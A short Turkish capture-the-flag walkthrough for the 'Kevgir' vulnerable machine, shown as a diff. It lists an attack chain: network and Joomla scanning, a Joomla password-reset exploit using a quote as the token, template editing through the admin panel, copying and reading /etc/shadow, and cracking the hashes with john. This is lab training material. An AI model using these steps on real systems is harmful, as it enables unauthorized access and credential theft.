@@ -1,0 +1,9 @@
+KEVGİR MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.96 bulunur.
+2 - nmap -sT -A 192.168.2.96
+3 - joomscan -u http://192.168.2.96:8081
+4 - https://www.exploit-db.com/exploits/6234, Token: ', Change Password
+5 - http://192.168.2.96:8081/administrator/, Extensions -> Template Manager -> rhuk_milkyway
+6 - cp /etc/shadow /tmp, cat /tmp/shadow
+7 - john hash -w /usr/share/wordlists/rockyou.txt, admin:admin, user:resu
+8 - su admin 
